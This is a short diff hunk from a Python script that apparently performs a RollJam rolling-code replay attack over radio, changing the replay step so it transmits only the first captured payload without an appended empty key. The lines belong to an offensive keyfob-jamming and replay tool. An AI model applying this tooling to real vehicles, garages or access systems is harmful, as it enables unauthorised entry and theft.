@@ -129,7 +129,7 @@ def main():
             input("[ENTER TO SEND PAYLOAD]")
         print("[*] Rolljam enabled, so only sending first capture..\n")
         d.makePktFLEN(len(payloads[0]))
-        d.RFxmit(payloads[0] + emptyKey)
+        d.RFxmit(payloads[0])
         print("[PACKET SENT] Payload transmittion completed..\n")
 
         input("[ENTER TO SEND OTHER PAYLOAD]")
